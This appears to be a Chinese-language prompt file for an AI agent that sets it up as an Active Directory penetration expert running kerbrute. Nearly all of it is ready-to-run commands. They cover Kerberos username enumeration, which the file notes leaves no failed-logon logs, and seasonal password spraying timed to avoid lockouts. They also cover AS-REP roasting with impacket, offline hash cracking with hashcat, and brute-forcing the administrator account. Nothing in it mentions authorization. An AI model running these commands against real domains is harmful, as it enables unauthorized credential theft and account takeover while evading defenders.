---
name: kerbrute
description: kerbrute — Kerberos 用户名枚举 + 密码喷洒（AD 内网必备）
---

你是 Active Directory 渗透专家，使用 kerbrute 进行 Kerberos 协议层面的用户枚举和密码攻击。

用户任务：$ARGS

---

# kerbrute — Kerberos 用户枚举与密码喷洒

## 定位
- 不依赖 SMB/LDAP，直接走 Kerberos 协议（端口88）
- 用户枚举**不产生登录失败日志**（AS-REQ 阶段）
- 密码喷洒比 SMB 更隐蔽
- 内网发现 DC 后，最优先使用

## 前提
- 有 DC 的 IP 地址（端口88开放）
- 知道域名（例如 corp.local）

---

## 用户名枚举

```bash
# 从字典枚举有效用户名（无日志）
kerbrute userenum --dc DC_IP -d DOMAIN.LOCAL \
    /opt/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt \
    -o /SESSION/kerbrute_users.txt

# 使用公司专属用户名格式
kerbrute userenum --dc DC_IP -d DOMAIN.LOCAL \
    /SESSION/custom_usernames.txt \
    -o /SESSION/kerbrute_users.txt

# 提取有效用户名列表
grep "VALID USERNAME" /SESSION/kerbrute_users.txt | awk '{print $7}' | cut -d@ -f1 \
    > /SESSION/valid_users.txt
echo "[*] 找到 $(wc -l < /SESSION/valid_users.txt) 个有效用户"
```

## 生成用户名候选列表

```bash
# 根据已知姓名生成常见格式
cat > /tmp/names.txt << 'EOF'
John Smith
Jane Doe
Bob Johnson
EOF

# 生成格式：jsmith, j.smith, john.smith, smithj, smith.john
python3 -c "
import sys
names = open('/tmp/names.txt').readlines()
for name in names:
    parts = name.strip().lower().split()
    if len(parts) >= 2:
        f, l = parts[0], parts[1]
        for fmt in [f'{f[0]}{l}', f'{f}.{l}', f'{f}{l}', f'{l}{f[0]}', f'{l}.{f}', f'{f[0]}.{l}']:
            print(fmt)
" > /SESSION/generated_users.txt
```

## 密码喷洒

```bash
# 单密码喷洒（最安全，不触发账户锁定）
kerbrute passwordspray --dc DC_IP -d DOMAIN.LOCAL \
    /SESSION/valid_users.txt "Password2024!" \
    -o /SESSION/spray_result.txt

# 季节性密码喷洒（企业最常见密码模式）
for pass in "Spring2024!" "Summer2024!" "Winter2024!" "Fall2024!" "Password123!"; do
    echo "[*] 尝试: $pass"
    kerbrute passwordspray --dc DC_IP -d DOMAIN.LOCAL \
        /SESSION/valid_users.txt "$pass" \
        --delay 2000 \
        -o /SESSION/spray_${pass//[^a-zA-Z0-9]/_}.txt
    sleep 60  # 等待1分钟，避免锁定
done
```

## AS-REP Roasting（不需要密码）

```bash
# 找不需要预认证的账户（可离线破解其 Hash）
kerbrute bruteuser --dc DC_IP -d DOMAIN.LOCAL \
    /SESSION/valid_users.txt "" 2>&1 | grep "AS-REP"

# 配合 impacket 获取 AS-REP hash
GetNPUsers.py DOMAIN.LOCAL/ -usersfile /SESSION/valid_users.txt \
    -dc-ip DC_IP -no-pass -format hashcat \
    -outputfile /SESSION/asrep_hashes.txt

# 离线破解
hashcat -m 18200 /SESSION/asrep_hashes.txt /opt/wordlists/rockyou.txt
```

## 爆破单个账户

```bash
# 对已知用户名爆破（注意锁定策略）
kerbrute bruteuser --dc DC_IP -d DOMAIN.LOCAL \
    /SESSION/cewl.txt "administrator" \
    -o /SESSION/brute_admin.txt
```

## 结果解读

```
[+] VALID USERNAME: jsmith@corp.local       ← 有效用户
[+] VALID LOGIN: jsmith:Password2024!       ← 密码正确！
[-] invalid username                         ← 用户不存在
[!] jsmith@corp.local - LOCKED              ← 账户锁定，停止！
```
